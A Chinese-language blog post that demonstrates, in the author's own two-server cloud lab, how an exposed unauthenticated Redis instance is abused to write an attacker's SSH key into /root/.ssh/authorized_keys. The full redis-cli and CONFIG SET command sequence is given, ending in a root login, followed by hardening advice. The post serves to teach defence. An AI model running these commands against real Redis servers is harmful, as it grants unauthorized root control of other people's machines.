title: Redis漏洞攻击
date: 2018-04-6 15:34:46
categories: 个人随笔
tags: [Redis]
---

在公网暴露端口的无防护Redis实例，很容易成为攻击者直接攻破的跳板，下面讲述一下攻击过程。
<!--more-->
在阿里云上分别申请两台服务器，分别是
肉鸡： `172.17.171.122`
攻击者：`172.17.171.123`

## 配置无防护的肉鸡

登陆`172.17.171.122`

```
root@Target:~# wget http://download.redis.io/releases/redis-4.0.9.tar.gz
root@Target:~# tar xzf redis-4.0.9.tar.gz
root@Target:~# cd redis-4.0.9
root@Target:~# make
root@Target:~# vim redis.conf
```

编辑redis.conf，把 bind 127.0.0.1 注释掉，以开放端口到外部端口， 并把`protected-mode yes`改为`protected-mode no`，使得外界不用密码也能够访问到此redis实例。

```bash
src/redis-server redis.conf
```

## 实施攻击

登陆`172.17.171.123`

```
root@Atacker:~# apt-get update
root@Atacker:~# apt-get install redis-tools
root@Atacker:~# ssh-keygen # 需相应的全默认回车
root@Atacker:~# (echo -e "\n";cat .ssh/id_rsa.pub;echo -e "\n") > pubkey.txt
root@Atacker:~# cat pubkey.txt | redis-cli -h 172.17.171.122 -x set "pubkey"
root@Atacker:~# redis-cli -h 172.17.171.122
172.17.171.122:6379> config set dir /root/.ssh
172.17.171.122:6379> config set dbfilename "authorized_keys"
172.17.171.122:6379> save
172.17.171.122:6379> exit
root@Atacker:~# ssh root@172.17.171.122
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-105-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Welcome to Alibaba Cloud Elastic Compute Service !

Last login: Fri Apr  6 15:33:41 2018 from 172.17.171.123
root@Target:~#
```

## 原理

```
root@Target:~# cat .ssh/authorized_keys
REDIS0008�	redis-ver4.0.9�
redis-bits�@�ctime�H#�Zused-mem��
                                 �
                                  aof-preamble���pubkeyA�

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7xaxGi7ZQAMX7YJRiyBDdz1RGIaPiSl+LHk8AfIvBjFja3GTRy+YqYk/DrpG/AKpNW27nW4jxckkFuCxpmkXNCkl80EQfI4r1PqhW2qoTpYwX5EJlRP6W5oytS5qqMnNN9mGP3u3/VT7lakk57NjFusdAV00sxMWz/kvgi3ZBxMhtWizLDR04dY3+2uLPwu/0GK10iw1dBoRCig2AAFAwMUwUrxAfb7D0YkqD2tDYz0N3u9TzzXGXHrZEi/nFaBRIqKZEr5RT5gSQLV5BGQud5DsuMw04bt4rr1cvWSLUbFySyvtZh4EVZsYjsAV0rd+SNQ0vbel0ThbpWbALyFXd root@Atacker


a�	��x"����r
```

攻击者利用redis，把自己的公钥写到了.ssh/authroized_keys文件内，再使用ssh登陆的时候，便被认为是有权限的登陆者，从而获得了root账户的完全控制权。

## 反思

要禁止这些漏洞，要做以下检查

1. 不要使用root用户直接建立实例，可以为redis专门设置一个账户，或者用其他无sudo权限的用户开启redis-server，这样即使被攻破，影响也会小一些。
2. 没有特殊需求的话，防火墙不要轻易暴露公网端口，实例不要轻易绑定0.0.0.0，不要轻易使用默认6379端口，不要轻易把protected-mode设为no。
3. 如果连内网安全都无法保证，请设置密码。这是不推荐的策略，因为能够用防火墙防住的，尽量不要用密码防，毕竟密码有理论上的可破解性。
4. 用户的.ssh内的文件都应该权限设置为400，防止被别的用户篡改。

------

## 说明

1. 以上实例、IP、公钥都是临时申请的，不会再使用，业已删除，请不要乱试。
2. 实例都是基于纯净版debian 9.2 64bit，测试以上内容不需要额外做任何操作。
